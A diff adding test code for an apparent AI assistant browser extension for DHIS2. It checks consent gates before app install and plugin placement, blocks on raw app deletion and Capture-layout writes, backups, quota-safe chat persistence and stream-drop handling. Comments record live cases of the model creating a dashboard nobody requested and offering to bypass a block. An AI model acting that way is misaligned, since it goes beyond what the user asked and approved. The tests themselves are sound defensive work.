+    for (const t of ['Build a dashboard widget that shows enrollments. Show me a preview first.', 'make a widget but don\'t install it yet', 'create a KPI plugin', 'preview the app first, then install'])
+      truthy(`no install intent: "${t}"`, !asked(t));
+    const turn = d.turnCounter || 0;
+    vm.runInContext('lastUserText = "Build a dashboard widget. Show me a preview first.";', ctx);
+    const same = ctx.customAppApprovalProblem('ai-x', 'pv-0123456789abcdef', turn);
+    truthy('create with a preview from THIS turn is refused while the user has not approved', same && same._awaiting_approval === true && /preview_token="pv-0123456789abcdef"/.test(same._hint));
+    truthy('…and allowed once the turn has advanced (the user answered)', ctx.customAppApprovalProblem('ai-x', 'pv-0123456789abcdef', turn - 1) === null);
+    vm.runInContext('lastUserText = "Please create and install a medication widget";', ctx);
+    truthy('…and allowed in the same turn when the user asked to install', ctx.customAppApprovalProblem('ai-x', 'pv-0123456789abcdef', turn) === null);
+    vm.runInContext('lastUserText = "";', ctx);
+    vm.runInContext('lastUserText = "build me a widget";', ctx);
+    truthy('a file create with no earlier preview and no install request is refused', /has not seen a preview/.test((ctx.customAppApprovalProblem('ai-x', null, null) || {})._error || ''));
+    truthy('…allowed when the user asked to put it somewhere (placing implies installing)', (vm.runInContext('lastUserText = "create a chart plugin and add it to a new dashboard called Ops";', ctx), ctx.customAppApprovalProblem('ai-x', null, null)) === null);
+    truthy('…and allowed after a preview shown in an earlier turn', (vm.runInContext('lastUserText = "ok";', ctx), ctx.customAppApprovalProblem('ai-x', null, turn - 1)) === null);
+    vm.runInContext('lastUserText = "";', ctx);
+    const pvTurn = await ctx.recallCustomAppPreview(pv.preview_token);
+    truthy('the preview remembers the turn it was made in', pvTurn && pvTurn.spec && pvTurn.turn === turn);
+  }
+  truthy('preview / list / get_source are discovery actions; create is not',
+    ctx.isDiscoveryCall('manage_custom_app', { action: 'preview' }) && ctx.isDiscoveryCall('manage_custom_app', { action: 'list' }) && !ctx.isDiscoveryCall('manage_custom_app', { action: 'create' }));
+
+  // Raw dhis2_query can no longer install / uninstall apps.
+  d.writeAuth = { scope: 'broad', reason: 'verify' };
+  const rawDel = await ctx.executeTool('dhis2_query', { method: 'DELETE', path: 'apps/dashboard' });
+  truthy('dhis2_query DELETE apps/<key> is blocked → manage_custom_app', rawDel && rawDel._redirect === 'manage_custom_app');
+  // The Capture-layout block is unconditional, so its hint must not invite a
+  // "confirm and I'll write it" offer (seen live 2026-10-22 with GLM).
+  const capPut = await ctx.executeTool('dhis2_query', { method: 'PUT', path: 'dataStore/capture/enrollmentOverviewLayout', body: {} });
+  truthy('dhis2_query PUT dataStore/capture is blocked with an unconditional hint that points to the Tracker Plugin Configurator',
+    capPut && /^Blocked/.test(capPut._error || '') && /no user confirmation lifts it/.test(capPut._hint || '') && /manage_custom_app\(action="place"\)/.test(capPut._hint || '') && /Tracker Plugin Configurator/.test(capPut._hint || '') && !/confirm the exact JSON/.test(capPut._hint || ''));
+
+  // A write answered 204 is never re-sent: the empty-body retry turned a
+  // completed DELETE /api/apps/<key> into "404 App does not exist".
+  let n204 = 0;
+  ctx.fetch = () => {
+    n204++;
+    return Promise.resolve(n204 === 1
+      ? { ok: true, status: 204, statusText: 'No Content', type: 'basic', text: async () => '' }
+      : { ok: false, status: 404, statusText: 'Not Found', type: 'basic', text: async () => '{"message":"App does not exist: ai-verify-app"}' });
+  };
+  const del204 = await ctx.__realSafeDhis2Fetch('apps/ai-verify-app', { method: 'DELETE' });
+  truthy('a DELETE answered 204 is a success and is NOT re-sent', del204 && del204.success === true && n204 === 1);
+
+  // fetchViaTab: executeScript args must be cloneable — a body-less write
+  // (every DELETE) passed `undefined` and Chrome rejected the injection.
+  const savedTabs = chrome.tabs.query, savedScripting = chrome.scripting.executeScript;
+  let injectedArgs = null;
+  chrome.tabs.query = () => Promise.resolve([{ id: 7, url: 'http://localhost:8081/apps/dashboard' }]);
+  chrome.scripting.executeScript = (inj) => { injectedArgs = inj.args; return Promise.resolve([{ result: { ok: true, status: 204, statusText: 'No Content', text: '' } }]); };
+  const viaTab = await ctx.fetchViaTab('http://localhost:8081/api/42/apps/ai-verify-app', 'DELETE', {}, undefined);
+  truthy('fetchViaTab sends null (not undefined) as the body of a body-less write', injectedArgs && injectedArgs.length === 4 && injectedArgs[3] === null && viaTab && viaTab.status === 204);
+  chrome.tabs.query = savedTabs;
+  chrome.scripting.executeScript = savedScripting;
+
+  // A 409 from a direct DELETE (ObjectReport) keeps its reasons.
+  ctx.fetch = () => Promise.resolve({ ok: false, status: 409, statusText: 'Conflict', type: 'basic', text: async () => JSON.stringify({ httpStatus: 'Conflict', httpStatusCode: 409, status: 'ERROR', message: 'Could not delete', response: { responseType: 'ObjectReport', errorReports: [{ message: 'Object could not be deleted because it is associated with another object: Event', errorCode: 'E4030' }] } }) });
+  const del409 = await ctx.__realSafeDhis2Fetch('dataElements/a3kGcGpz8FJ', { method: 'DELETE' });
+  truthy('DELETE 409 (ObjectReport) surfaces errorReports + the soft-deleted-event hint', (del409.error_details || []).some((m) => /associated with another object: Event/.test(m)) && /softDeletedEventRemoval/.test(del409._hint || ''));
+
+  // Chrome answers a write from the extension origin with an empty 200 and
+  // DHIS2 installs nothing: uploadAppZip must not call that a success.
+  ctx.fetch = () => Promise.resolve({ ok: true, status: 200, type: 'basic', text: async () => '' });
+  const emptyUp = await ctx.uploadAppZip(new Uint8Array([1, 2, 3]), 'ai-verify-app.zip');
+  truthy('an empty 2xx upload response is "NOT installed" with an open-a-DHIS2-tab hint', /NOT installed/.test(emptyUp._error || '') && /DHIS2 tab/.test(emptyUp._hint || ''));
+
+  // Registry wiring + intent routing.
+  truthy('manage_custom_app is routed, write-capable, manual-gated, summarised, with a manual',
+    ctx.__TOOL_ROUTER.manage_custom_app === true && ctx.WRITE_CAPABLE_TOOL_NAMES.has('manage_custom_app') && ctx.MANUAL_TOOLS.has('manage_custom_app')
+    && typeof ctx.TOOL_SUMMARIES.manage_custom_app === 'string' && /getPropsFromParent/.test(ctx.MANUAL_EXTRAS.manage_custom_app || ''));
+  const intent = ctx.detectCustomAppIntent;
+  for (const t of ['Build a dashboard widget that shows ANC coverage by district', 'make an app that lists programs with their stage counts', 'create a plugin for the dashboard', 'update ai-kpi-plugin to show 4 cards', 'roll back my custom app'])
+    truthy(`intent: "${t}" → manage_custom_app`, intent(t.toLowerCase()));
+  for (const t of ['in the capture app create a program for tb', 'install the growth chart plugin', 'create a program indicator for anc visits', 'open the dashboard app'])
+    truthy(`no intent: "${t}"`, !intent(t.toLowerCase()));
+  const names = (txt) => ctx.getContextualTools({ appType: 'Dashboard' }, txt).map((x) => x.function.name);
+  truthy('getContextualTools offers manage_custom_app for a widget request', names('Build a dashboard widget that shows ANC coverage').includes('manage_custom_app'));
+  truthy('…and not for an ordinary indicator request', !names('create a program indicator for anc visits').includes('manage_custom_app'));
+
+  d.baseUrl = saved.baseUrl; d.apiVersion = saved.apiVersion; d.writeAuth = saved.writeAuth;
+  ctx.fetch = saved.fetch; ctx.safeDhis2Fetch = saved.sdf;
+}
+
+// ── Chat history must survive an over-quota state (live 2026-10-22) ─────────
+// On a big program's Capture page programMetadata was 6.1 MB; saveState wrote
+// it in the SAME set() as chatHistory, Chrome rejected the whole write
+// ("Session storage quota bytes exceeded"), the catch swallowed it, and after
+// the idle worker was evicted the next message ("yes install it") ran with no
+// history at all.
+async function runStatePersistenceChecks() {
+  console.log('\nState persistence (session quota):');
+  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
+  const d = ctx.__dhis2();
+  const realSession = chrome.storage.session;
+  const saved = {};
+  const QUOTA = 1_000_000; // stand-in for Chrome's 10 MB: any single value over it is rejected
+  chrome.storage.session = {
+    get: () => Promise.resolve({}),
+    remove: () => Promise.resolve(),
+    set: (obj) => {
+      if (JSON.stringify(obj).length > QUOTA) return Promise.reject(new Error('Session storage quota bytes exceeded. Values were not stored.'));
+      Object.assign(saved, JSON.parse(JSON.stringify(obj)));
+      return Promise.resolve();
+    },
+  };
+  const prevMeta = d.programMetadata;
+  try {
+    const drugs = Array.from({ length: 4000 }, (_, i) => ({ id: `opt${i}`, code: `DRUG_${i}`, displayName: `Drug number ${i} 500 mg tablet` }));
+    d.programMetadata = { id: 'vj5cpA2OOfZ', displayName: 'Pharmacy', programStages: [{ id: 'pHbLWI4CaxD', programStageDataElements: Array.from({ length: 15 }, () => ({ dataElement: { optionSet: { options: drugs } } })) }] };
+    vm.runInContext(`conversationHistory = [
+      { role: 'user', content: 'create a plugin' },
+      { role: 'assistant', content: null, tool_calls: [{ id: 'c1', type: 'function', function: { name: 'manage_custom_app', arguments: '{"action":"preview"}' } }] },
+      { role: 'tool', tool_call_id: 'c1', content: '{"preview":true,"preview_token":"pv-0123456789abcdef"}' },
+      { role: 'assistant', content: 'Shall I install it?' },
+    ];`, ctx);
+    await ctx.saveState();
+    truthy('chatHistory is persisted even when the program cache is over the quota', Array.isArray(saved.chatHistory) && saved.chatHistory.length === 4 && /pv-0123456789abcdef/.test(JSON.stringify(saved.chatHistory)));
+    truthy('the oversized programMetadata is left out of dhis2Full (re-fetched after a restart)', saved.dhis2Full && !saved.dhis2Full.programMetadata && saved.dhis2Full.baseUrl === d.baseUrl);
+    d.programMetadata = { id: 'small1', displayName: 'Small program', programStages: [] };
+    await ctx.saveState();
+    truthy('a normal-size programMetadata is still persisted', saved.dhis2Full && saved.dhis2Full.programMetadata && saved.dhis2Full.programMetadata.id === 'small1');
+    // A history that alone is over the quota keeps its most recent turns.
+    const big = 'x'.repeat(200_000);
+    vm.runInContext(`conversationHistory = ${JSON.stringify(Array.from({ length: 6 }, (_, i) => [{ role: 'user', content: `turn ${i} ${big}` }, { role: 'assistant', content: `answer ${i}` }]).flat())};`, ctx);
+    await ctx.saveState();
+    truthy('an over-quota history is halved until it fits, newest turns kept', Array.isArray(saved.chatHistory) && saved.chatHistory.length > 0 && saved.chatHistory.length < 12 && saved.chatHistory[saved.chatHistory.length - 1].content === 'answer 5' && saved.chatHistory[0].role === 'user');
+  } finally {
+    chrome.storage.session = realSession;
+    d.programMetadata = prevMeta;
+    vm.runInContext('conversationHistory = []; lastUserText = "";', ctx);
+  }
+  const agentSrc = fs.readFileSync(path.join(ROOT, 'src/agent.js'), 'utf8');
+  const chatHandler = agentSrc.slice(agentSrc.indexOf("case 'CHAT_MESSAGE'"), agentSrc.indexOf("case 'CHAT_MESSAGE'") + 3000);
+  truthy('CHAT_MESSAGE waits for the state restore before the turn reads the history', /await stateRestored;[\s\S]{0,40}await ensureConnected\(\)/.test(chatHandler));
+  truthy('CHAT_MESSAGE re-fetches a programMetadata that was not persisted', /freshCtx\.programId && !dhis2\.programMetadata/.test(chatHandler));
+}
+
+// ── Plugin placement (manage_custom_app place / unplace / placements) ────────
+// Formats verified 2026-10-22 against the Capture 106.2.2 bundle and the
+// Tracker Plugin Configurator's saved configs on 2.42.5.1. The server here is
+// an in-memory stand-in: a place → unplace round trip must leave every key
+// byte-identical (after jsonb key reordering) to where it started.
+async function runPlacementChecks() {
+  console.log('\nPlugin placement (dashboards · Capture pages · Capture forms):');
+  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
+  const eq = (label, got, want) => (JSON.stringify(got) === JSON.stringify(want) ? ok(label) : bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`));
+  const d = ctx.__dhis2();
+  const saved = { baseUrl: d.baseUrl, writeAuth: d.writeAuth, sdf: ctx.safeDhis2Fetch, src: ctx.loadCustomAppSource, tavily: vm.runInContext('_hasTavilyKey', ctx) };
+
+  // Tavily: browse_dhis2_docs only exists when a key is saved.
+  const arch = vm.runInContext('TOOLS', ctx).find((t) => t.function.name === 'architect_metadata');
+  vm.runInContext('_hasTavilyKey = false;', ctx);
+  const stripped = ctx.stripUnavailableToolActions([arch])[0].function;
+  truthy('no Tavily key: browse_dhis2_docs is not offered (enum, docs_query, description)', !stripped.parameters.properties.action.enum.includes('browse_dhis2_docs') && !stripped.parameters.properties.docs_query && !/browse_dhis2_docs/.test(stripped.description));
+  truthy('…and the original tool definition is left untouched', arch.function.parameters.properties.action.enum.includes('browse_dhis2_docs'));
+  vm.runInContext('_hasTavilyKey = true;', ctx);
+  truthy('with a Tavily key: browse_dhis2_docs is offered', ctx.stripUnavailableToolActions([arch])[0].function.parameters.properties.action.enum.includes('browse_dhis2_docs'));
+  vm.runInContext(`_hasTavilyKey = ${saved.tavily};`, ctx);
+
+  // Pure helpers.
+  const KEY = 'ai-test-meds';
+  const SRC = `http://localhost:8081/api/apps/${KEY}/plugin.html`;
+  truthy('isPluginSourceOf: ai-test-meds never matches ai-test-meds-2', ctx.isPluginSourceOf(KEY, SRC) && !ctx.isPluginSourceOf(KEY, 'http://x/api/apps/ai-test-meds-2/plugin.html') && ctx.isPluginSourceOf(KEY, `/api/apps/${KEY}/plugin.html`));
+  truthy('canonicalJson ignores object key order (jsonb reorders keys)', ctx.canonicalJson({ b: 1, a: [{ y: 2, x: 1 }] }) === ctx.canonicalJson({ a: [{ x: 1, y: 2 }], b: 1 }));
+  const def = ctx.captureDefaultLayout('enrollmentOverviewLayout');
+  eq('enrollment dashboard default = Capture 106 bundle default', [def.leftColumn.map((w) => w.name), def.rightColumn.map((w) => w.name)], [['StagesAndEvents'], ['QuickActions', 'ErrorWidget', 'WarningWidget', 'EnrollmentNote', 'FeedbackWidget', 'IndicatorWidget', 'TrackedEntityRelationship', 'ProfileWidget', 'EnrollmentWidget']]);
+  const placed = ctx.layoutWithPlugin(def, KEY, SRC, 'right', 'top');
+  truthy('layoutWithPlugin puts { type:"plugin", source } at the top of the right column', placed.layout.rightColumn[0].type === 'plugin' && placed.layout.rightColumn[0].source === SRC && placed.layout.rightColumn.length === 10);
+  truthy('placing twice is a no-op (already placed)', ctx.layoutWithPlugin(placed.layout, KEY, SRC, 'left', 'bottom').already === true);
+  const back = ctx.layoutWithoutPlugin(placed.layout, KEY);
+  truthy('layoutWithoutPlugin removes it and the result is Capture\'s default again', back.removed === 1 && ctx.isDefaultCaptureLayout(back.layout, 'enrollmentOverviewLayout'));
+
+  const stageCtx = {
+    id: 'pHbLWI4CaxD', kind: 'program_stage', name: 'Visit', programId: 'vj5cpA2OOfZ', programName: 'Pharmacy', customForm: false,
+    fieldIds: ['deWeight001', 'deHeight001', 'deBmi000001', 'deNote00001'],
+    fields: { deWeight001: { id: 'deWeight001', displayName: 'Weight' }, deHeight001: { id: 'deHeight001', displayName: 'Height' }, deBmi000001: { id: 'deBmi000001', displayName: 'BMI' }, deNote00001: { id: 'deNote00001', displayName: 'Note' } },
+    sections: [{ id: 'secBody0001', name: 'Body', fieldIds: ['deWeight001', 'deHeight001', 'deBmi000001'] }, { id: 'secNote0001', name: 'Notes', fieldIds: ['deNote00001'] }],
+  };
+  const dflt = ctx.defaultCaptureFormConfig(stageCtx);
+  eq('default form config mirrors the stage sections (Configurator format)', dflt, [{ id: 'secBody0001', name: 'Body', elements: [{ id: 'deWeight001', type: 'TrackedEntityAttribute' }, { id: 'deHeight001', type: 'TrackedEntityAttribute' }, { id: 'deBmi000001', type: 'TrackedEntityAttribute' }] }, { id: 'secNote0001', name: 'Notes', elements: [{ id: 'deNote00001', type: 'TrackedEntityAttribute' }] }]);
+  truthy('a stage without sections gets one untitled section with every field', (() => { const c = ctx.defaultCaptureFormConfig({ ...stageCtx, sections: [] }); return c.length === 1 && !c[0].name && c[0].elements.length === 4; })());
+  eq('a stage with a custom HTML form gets only the plugin section', ctx.defaultCaptureFormConfig({ ...stageCtx, customForm: true }), []);
+  const fm = [{ plugin_field: 'weight', field_id: 'deWeight001' }, { plugin_field: 'height', field_id: 'deHeight001' }, { plugin_field: 'bmi', field_id: 'deBmi000001', replace_field: true }];
+  const inBody = ctx.formWithPlugin(dflt, stageCtx, { key: KEY, name: 'BMI', source: SRC, fieldMap: fm, section: 'body', sectionName: null, position: 'bottom' });
+  const bodyEls = inBody.sections[0].elements;
+  truthy('form plugin goes into the named section with the Configurator\'s fieldMap shape', bodyEls[bodyEls.length - 1].type === 'plugin' && bodyEls[bodyEls.length - 1].pluginSource === SRC
+    && JSON.stringify(bodyEls[bodyEls.length - 1].fieldMap[0]) === JSON.stringify({ IdFromApp: 'deWeight001', IdFromPlugin: 'weight', objectType: 'TrackedEntityAttribute' }));
+  truthy('replace_field takes the field out of the form; kept fields stay', !bodyEls.some((e) => e.id === 'deBmi000001') && bodyEls.some((e) => e.id === 'deWeight001'));
+  const undone = ctx.formWithoutPlugin(inBody.sections, KEY);
+  truthy('removing the plugin puts the replaced field back where the plugin was → default form again', undone.removed === 1 && ctx.canonicalJson(undone.sections) === ctx.canonicalJson(dflt));
+  const own = ctx.formWithPlugin(dflt, stageCtx, { key: KEY, name: 'BMI', source: SRC, fieldMap: fm.slice(0, 2), section: null, sectionName: 'Calculator', position: 'top' });
+  truthy('without section the plugin gets its own section (top), removed again with it', own.sections[0].name === 'Calculator' && own.sections[0].elements[0].type === 'plugin'
+    && ctx.canonicalJson(ctx.formWithoutPlugin(own.sections, KEY).sections) === ctx.canonicalJson(dflt));
+  truthy('placing in the same form twice keeps ONE plugin element (upsert)', ctx.formPluginElements(ctx.formWithPlugin(inBody.sections, stageCtx, { key: KEY, name: 'BMI', source: SRC, fieldMap: fm, section: 'Body', position: 'top' }).sections, KEY).length === 1);
+  truthy('an unknown section is refused with the section list', /No section "Vitals"/.test(ctx.formWithPlugin(dflt, stageCtx, { key: KEY, name: 'x', source: SRC, fieldMap: fm, section: 'Vitals', position: 'top' })._error || ''));
+  const code = "setFieldValue({ fieldId: 'bmi', value: x }); const w = values.weight; const t = values['temp'];";
+  const al = ctx.pluginFieldAliasProblems(code, [{ plugin_field: 'weight' }, { plugin_field: 'height' }]);
+  truthy('writing an unmapped alias is an error; reading one is a warning', al.errors.some((e) => /writes "bmi"/.test(e)) && al.warnings.some((w) => /values\.temp/.test(w)) && al.warnings.some((w) => /"height" is mapped but/.test(w)));
+  truthy('field_map: a field outside the stage is refused', /not a data element of stage/.test((ctx.fieldMapProblem([{ plugin_field: 'x', field_id: 'zzzzzzzzzzz' }], stageCtx) || {})._error || ''));
+  truthy('field_map: an alias mapped twice is refused', /mapped twice/.test((ctx.fieldMapProblem([{ plugin_field: 'x', field_id: 'deWeight001' }, { plugin_field: 'x', field_id: 'deHeight001' }], stageCtx) || {})._error || ''));
+
+  // Round trips against an in-memory DHIS2.
+  const server = {
+    datastore: {
+      capture: {
+        enrollmentOverviewLayout: { OtherProg01: { leftColumn: [{ type: 'component', name: 'StagesAndEvents' }], rightColumn: [{ type: 'plugin', source: '/api/apps/someone-else/plugin.html' }] } },
+        dataEntryForms: { otherStage1: [{ id: 's1', elements: [{ id: 'x1', type: 'TrackedEntityAttribute' }] }] },
+      },
+      'dhis2-ai-extension-backups': {},
+    },
+    dashboards: { dash0000001: { id: 'dash0000001', name: 'Ops', dashboardItems: [] } },
+  };
+  const original = JSON.parse(JSON.stringify(server.datastore.capture));
+  const calls = [];
+  ctx.safeDhis2Fetch = async (p, o = {}) => {
+    const method = o.method || 'GET';
+    calls.push(`${method} ${p.split('?')[0]}`);
+    if (p === 'apps') return [{ key: KEY, name: 'Medication widget', displayName: 'Medication widget', version: '1.0.0', developer: { company: 'dhis2-ai-assistant' }, pluginLaunchUrl: SRC, plugin_type: 'CAPTURE', appState: 'OK' }, { key: 'ai-test-dash', name: 'Dash', developer: { company: 'dhis2-ai-assistant' }, pluginLaunchUrl: 'http://localhost:8081/api/apps/ai-test-dash/plugin.html', plugin_type: 'DASHBOARD' }];
+    if (p === 'dataStore') return Object.keys(server.datastore);
+    let m = p.match(/^dataStore\/([^/?]+)(?:\/([^?]+))?/);
+    if (m) {
+      const ns = decodeURIComponent(m[1]); const k = m[2] && decodeURIComponent(m[2]);
+      const space = server.datastore[ns] || (server.datastore[ns] = {});
+      if (!k) return Object.keys(space);
+      if (method === 'GET') return k in space ? JSON.parse(JSON.stringify(space[k])) : { _error: 'HTTP 404', _status: 404 };
+      if (method === 'POST') { if (k in space) return { _error: 'HTTP 409', _status: 409 }; space[k] = JSON.parse(JSON.stringify(o.body)); return { httpStatus: 'Created' }; }
+      if (method === 'PUT') { if (!(k in space)) return { _error: 'HTTP 404', _status: 404 }; space[k] = JSON.parse(JSON.stringify(o.body)); return {}; }
+      if (method === 'DELETE') { delete space[k]; return {}; }
+    }
+    if (p.startsWith('programs/vj5cpA2OOfZ')) return { id: 'vj5cpA2OOfZ', displayName: 'Pharmacy', programType: 'WITH_REGISTRATION', programTrackedEntityAttributes: [], programSections: [] };
+    if (p.startsWith('programs/eventProg01')) return { id: 'eventProg01', displayName: 'Lab', programType: 'WITHOUT_REGISTRATION' };
+    if (p.startsWith('programStages?filter=id:eq:pHbLWI4CaxD')) return { programStages: [{ id: 'pHbLWI4CaxD' }] };
+    if (p.startsWith('programStages?filter=')) return { programStages: [] };
+    if (p.startsWith('programStages/pHbLWI4CaxD')) return { id: 'pHbLWI4CaxD', displayName: 'Visit', formType: 'SECTION', program: { id: 'vj5cpA2OOfZ', displayName: 'Pharmacy', programType: 'WITH_REGISTRATION' },
+      programStageDataElements: stageCtx.fieldIds.map((id) => ({ dataElement: { id, displayName: stageCtx.fields[id].displayName, valueType: 'NUMBER' } })),
+      programStageSections: [{ id: 'secBody0001', displayName: 'Body', sortOrder: 1, dataElements: [{ id: 'deWeight001' }, { id: 'deHeight001' }, { id: 'deBmi000001' }] }, { id: 'secNote0001', displayName: 'Notes', sortOrder: 2, dataElements: [{ id: 'deNote00001' }] }] };
+    if (p.startsWith('dashboards?filter=')) return { dashboards: [] };
+    return { _error: `unexpected ${method} ${p}` };
+  };
+  ctx.loadCustomAppSource = async () => ({ aiManifest: { version: '1.0.0' }, sources: { 'plugin.jsx': "const A = ({ values, setFieldValue }) => { setFieldValue({ fieldId: 'bmi', value: values.weight / values.height }); };" } });
+  d.baseUrl = 'http://localhost:8081';
+  // Placement needs to have been asked for (live 2026-10-22: the model created
+  // a dashboard nobody asked for after "yes, install it").
+  const asked = ctx.userAskedToPlace;
+  for (const t of ['Create a dashboard plugin … and add it to a new dashboard called "ai-test LLM malaria".', 'lists them as a widget on the enrollment dashboard', 'Please create and install and enrollment plugin here that lists them as a widget here', 'Add a plugin to this Initial Assessment form that reads the weight', 'yes, place it'])
+    truthy(`placement asked: "${t.slice(0, 60)}"`, asked([t]));
+  for (const t of ['Build a dashboard widget that shows the number of enrollments per org unit for the selected period. Show me a preview first.', 'yes, install it', 'make an app that lists programs'])
+    truthy(`no placement asked: "${t.slice(0, 60)}"`, !asked([t]));
+  d.writeAuth = { scope: 'broad', reason: 'verify' };
+  vm.runInContext('lastUserText = "yes, install it"; conversationHistory = [{ role: "user", content: "Build a dashboard widget that shows enrollments. Show me a preview first." }, { role: "assistant", content: "Preview passed. Shall I install it?" }];', ctx);
+  truthy('place is refused when nobody asked for a placement (nothing written)', /has not asked for this plugin to be put/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'vj5cpA2OOfZ' }))._error || '') && !server.datastore.capture.enrollmentOverviewLayout.vj5cpA2OOfZ);
+  vm.runInContext('lastUserText = "yes please"; conversationHistory = [{ role: "user", content: "build a medication widget" }, { role: "assistant", content: "Installed. Should I add it to the Pharmacy enrollment dashboard?" }];', ctx);
+  truthy('…allowed when the user says yes to the assistant\'s placement question', vm.runInContext('placementWasRequested()', ctx) === true);
+  vm.runInContext('lastUserText = "yes, install it"; conversationHistory = [{ role: "user", content: "Build a dashboard widget that shows enrollments" }, { role: "assistant", content: "The dashboard widget compiled. Shall I install it?" }];', ctx);
+  truthy('…but "yes" to "install this dashboard widget?" is not a placement', vm.runInContext('placementWasRequested()', ctx) === false);
+  vm.runInContext('lastUserText = "add it to the enrollment dashboard of Pharmacy"; conversationHistory = [];', ctx);
+  d.writeAuth = { scope: 'read_only', reason: 'verify' };
+  const refused = await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'vj5cpA2OOfZ' });
+  truthy('place is refused on a read-only turn (write gate)', /Refused/.test(refused._error || '') && !server.datastore.capture.enrollmentOverviewLayout.vj5cpA2OOfZ);
+  d.writeAuth = { scope: 'broad', reason: 'verify' };
+  const p1 = await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'vj5cpA2OOfZ' });
+  const lay = server.datastore.capture.enrollmentOverviewLayout;
+  truthy('place enrollment_dashboard: Capture default + plugin written for that program only', p1.success === true && p1.started_from_capture_default === true
+    && lay.vj5cpA2OOfZ.rightColumn[0].source === SRC && lay.vj5cpA2OOfZ.rightColumn.length === 10 && ctx.canonicalJson(lay.OtherProg01) === ctx.canonicalJson(original.enrollmentOverviewLayout.OtherProg01));
+  const bk = server.datastore['dhis2-ai-extension-backups'][p1.backup.key];
+  truthy('…the previous value was backed up first (manage_backups can restore it)', bk && bk.capture_config && bk.capture_config.key === 'enrollmentOverviewLayout' && ctx.canonicalJson(bk.capture_config.value) === ctx.canonicalJson(original.enrollmentOverviewLayout));
+  truthy('an event program is refused for enrollment pages', /event program/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'eventProg01' }))._error || ''));
+  truthy('a CAPTURE plugin is refused on a dashboard', /only DASHBOARD plugins/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'dashboard', dashboard_id: 'dash0000001' }))._error || ''));
+  truthy('place refuses an unmapped setFieldValue alias', /writes "bmi"/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'form', program_stage_id: 'pHbLWI4CaxD', field_map: [{ plugin_field: 'weight', field_id: 'deWeight001' }, { plugin_field: 'height', field_id: 'deHeight001' }] }))._error || ''));
+  const p2 = await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'form', program_stage_id: 'pHbLWI4CaxD', section: 'Body', field_map: fm });
+  const form = server.datastore.capture.dataEntryForms.pHbLWI4CaxD;
+  truthy('place form: the stage form is written from its sections + the plugin with the field map', p2.success === true && form.length === 2 && ctx.formPluginElements(form, KEY).length === 1 && ctx.canonicalJson(server.datastore.capture.dataEntryForms.otherStage1) === ctx.canonicalJson(original.dataEntryForms.otherStage1));
+  const pl = await ctx.executeManageCustomApp({ action: 'placements', key: KEY });
+  truthy('placements lists the enrollment page and the form', pl.total === 2 && pl.capture_pages[0].program_id === 'vj5cpA2OOfZ' && pl.forms[0].context_id === 'pHbLWI4CaxD' && pl.forms[0].field_map.length === 3);
+  truthy('placements is a discovery (read-only) action', ctx.isDiscoveryCall('manage_custom_app', { action: 'placements' }) && !ctx.isDiscoveryCall('manage_custom_app', { action: 'place' }));
+  const un = await ctx.executeManageCustomApp({ action: 'unplace', key: KEY });
+  truthy('unplace removes it everywhere and drops the entries it created', un.success === true && un.removed.length === 2 && un.removed.every((r) => r.entry_removed === true));
+  truthy('after unplace dataStore/capture is exactly as it was before (jsonb-equal)', ctx.canonicalJson(server.datastore.capture) === ctx.canonicalJson(original));
+  const restore = await ctx.restoreFromBackup(p1.backup.key);
+  truthy('manage_backups restore of a Capture backup rewrites the old value', restore.success === true && ctx.canonicalJson(server.datastore.capture.enrollmentOverviewLayout) === ctx.canonicalJson(original.enrollmentOverviewLayout));
+
+  // Dashboard APP items.
+  vm.runInContext('lastUserText = "yes, install it"; conversationHistory = [];', ctx);
+  truthy('manage_dashboards refuses an APP item nobody asked to place (no route around place)', /not asked for this plugin to be put on a dashboard/.test((await ctx.checkDashboardAppItem('ai-test-dash'))._error || ''));
+  vm.runInContext('lastUserText = "put the KPI plugin on the Ops dashboard";', ctx);
+  const chk = await ctx.checkDashboardAppItem('ai-test-dash');
+  truthy('a DASHBOARD plugin is a valid dashboard APP item', !!chk.app && !chk._error);
+  truthy('a CAPTURE plugin is not', /not a dashboard plugin/.test((await ctx.checkDashboardAppItem(KEY))._error || ''));
+  truthy('an app that is not installed is not', /No app with key/.test((await ctx.checkDashboardAppItem('ai-nope'))._error || ''));
+
+  d.baseUrl = saved.baseUrl; d.writeAuth = saved.writeAuth;
+  ctx.safeDhis2Fetch = saved.sdf; ctx.loadCustomAppSource = saved.src;
+  vm.runInContext('conversationHistory = []; lastUserText = "";', ctx);
+}
+
+// ── A provider connection dropped mid-stream (Fireworks, live 2026-10-22) ────
+// read() rejects, the handler called reader.cancel(), and cancel() on an
+// errored stream returns a promise rejected with the same error — unhandled.
+// Chrome logs it as an uncaught error; Node kills the process (it took the
+// visual suite down before its cleanup ran).
+async function runStreamDropChecks() {
+  console.log('\nLLM stream dropped mid-response:');
+  const unhandled = [];
+  const onUnhandled = (e) => unhandled.push(String(e && e.message || e));
+  process.on('unhandledRejection', onUnhandled);
+  const savedFetch = ctx.fetch;
+  try {
+    vm.runInContext(`_cachedApiKey = 'verify-key'; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'fireworks', apiBaseUrl: 'https://llm.invalid/v1', modelId: 'm' };`, ctx);
+    for (const flavour of ['openai', 'anthropic']) {
+      ctx.fetch = async () => new Response(new ReadableStream({
+        start(c) {
+          c.enqueue(new TextEncoder().encode(flavour === 'openai'
+            ? 'data: {"choices":[{"index":0,"delta":{"content":"Hel"}}]}\n\n'
+            : 'event: message_start\ndata: {"type":"message_start","message":{"id":"x","content":[]}}\n\n'));
+          setTimeout(() => c.error(new TypeError('terminated')), 5);
+        },
+      }), { status: 200, headers: { 'Content-Type': 'text/event-stream' } });
+      if (flavour === 'anthropic') vm.runInContext(`_cachedProviderConfig = { ..._cachedProviderConfig, providerType: 'anthropic', apiBaseUrl: 'https://llm.invalid' };`, ctx);
+      let err = null;
